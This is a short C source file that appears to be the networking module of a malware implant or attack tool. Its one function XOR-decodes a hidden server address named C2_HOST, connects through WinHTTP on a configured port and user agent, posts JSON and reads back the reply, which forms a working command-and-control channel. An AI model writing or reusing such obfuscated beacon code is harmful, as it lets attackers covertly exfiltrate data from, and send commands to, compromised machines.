#include "common.h"
#include <winhttp.h>

#pragma comment(lib, "winhttp.lib")

int http_post_json(const char *path, const char *json_body, char *resp, size_t resp_sz) {
    wchar_t w_host[128];
    wchar_t w_path[256];
    wchar_t w_ua[128];

    char host_dec[128];
    strncpy(host_dec, C2_HOST, sizeof(host_dec) - 1);
    xor_decode(host_dec);

    MultiByteToWideChar(CP_UTF8, 0, host_dec, -1, w_host, 128);
    MultiByteToWideChar(CP_UTF8, 0, path, -1, w_path, 256);
    MultiByteToWideChar(CP_UTF8, 0, USER_AGENT, -1, w_ua, 128);

    HINTERNET ses = WinHttpOpen(w_ua, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!ses) return -1;

    HINTERNET con = WinHttpConnect(ses, w_host, (INTERNET_PORT)C2_PORT, 0);
    if (!con) {
        WinHttpCloseHandle(ses);
        return -1;
    }

    HINTERNET req = WinHttpOpenRequest(con, L"POST", w_path, NULL,
                                       WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    if (!req) {
        WinHttpCloseHandle(con);
        WinHttpCloseHandle(ses);
        return -1;
    }

    const wchar_t *hdrs = L"Content-Type: application/json\r\n";
    BOOL ok = WinHttpSendRequest(req, hdrs, (DWORD)-1L,
                                 (LPVOID)json_body, (DWORD)strlen(json_body),
                                 (DWORD)strlen(json_body), 0);
    if (!ok || !WinHttpReceiveResponse(req, NULL)) {
        WinHttpCloseHandle(req);
        WinHttpCloseHandle(con);
        WinHttpCloseHandle(ses);
        return -1;
    }

    size_t total = 0;
    DWORD avail = 0;
    resp[0] = '\0';
    while (WinHttpQueryDataAvailable(req, &avail) && avail > 0) {
        if (total + avail >= resp_sz - 1) break;
        DWORD read = 0;
        if (!WinHttpReadData(req, resp + total, (DWORD)(resp_sz - 1 - total), &read)) break;
        total += read;
        resp[total] = '\0';
    }

    WinHttpCloseHandle(req);
    WinHttpCloseHandle(con);
    WinHttpCloseHandle(ses);
    return (int)total;
}
